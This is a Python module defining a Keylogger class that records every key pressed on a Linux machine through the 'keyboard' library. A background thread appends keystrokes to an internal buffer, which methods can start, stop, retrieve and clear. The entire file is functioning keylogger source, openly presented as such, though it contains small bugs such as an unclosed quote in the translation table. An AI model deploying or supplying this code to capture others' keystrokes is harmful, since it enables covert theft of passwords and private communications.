"""
    This module contains the Keylogger class which is used to capture keystrokes.
"""


from sys import stderr
from threading import Thread, Lock
import keyboard
import time


TRANSLATION_TABLE = {
        "space":" ",
        "ctrl":"'CTRL'",
        "shift":"'SHIFT",
        "tab":"'TAB'",
        "enter":"'ENTER'",
        "backspace":"\b",
        "alt":"'ALT'"
    }


class Keylogger:
    """
        The Keylogger class is a wrapper around the keyboard module (https://pypi.org/project/keyboard/).
        It has methods for starting, stopping, and retreiving the contents of a keylogger.
        It reads keystrokes directly from the /dev/input files on the Linux filesystem.
        It is therefore only compatible with Linux.
    """

    def __init__(self):
        """
            Constructor method for the Keylogger class.

            Parameters
            ----------
            None

            Returns
            -------
            An instance of a Keylogger object.
        """
        self.__keylog = ""
        self.__active = False
        self.__stop = False
        self.__thread = None
        self.__lock = Lock()
    

    def __read_keystrokes(self):
        while not self.__stop:
            event = keyboard.read_event()
            if event.event_type == "down":
                try:
                    temp = TRANSLATION_TABLE[event.name]
                    self.__lock.acquire()
                    self.__keylog += temp
                    self.__lock.release()
                except KeyError:
                    self.__lock.acquire()
                    self.__keylog += event.name
                    self.__lock.release()
        self.__active = False


    def start(self) -> bool:
        """
            Starts the keylogger.

            Attempts to start the keylogger. If the keylogger is already in a running state,
            then this function will do nothing and return False. If the keylogger is not in a running
            state, then this function will start the keylogger and return True.

            Parameters
            ----------
            None

            Returns
            -------
            bool - True on success, False on failure.
                        
        """
        if self.__active:
            return False
        self.__active = True
        self.__thread = Thread(target=self.__read_keystrokes)
        self.__thread.start()   
        return True


    def stop(self) -> bool:
        """
            Stops the keylogger.

            Attempts to stop the keylogger. If the keylogger is not in an active state,
            then this function will do nothing and return False. If the keylogger is in an active state,
            then this function will stop the keylogger and return True.

            Parameters
            ----------
            None

            Returns
            -------
            bool - True on success, False on failure.
        """
        if not self.__active:
            return False
        self.__stop = True
        self.__active = False
        return True

    def get_keylog(self) -> str:
        """
            Returns the contents of the keylogger.

            Uses threading locks to access the internal keystroke data
            and return it's contents in a thread-safe manner.

            Parameters
            ----------
            None

            Returns
            -------
            str - the contents of the keylogger as a string.
        """
        keylog = ""
        self.__lock.acquire()
        keylog = self.__keylog
        self.__lock.release()
        return keylog
    

    def clear_keylog(self) -> None:
        """
            Clears the keylogger.

            Uses threading locks to access the internal keystroke data and clears
            the keystroke buffer in a thread-safe manner.

            Parameters
            ----------
            None

            Returns
            -------
            None
        """
        self.__lock.acquire()
        self.__keylog = ""
        self.__lock.release()
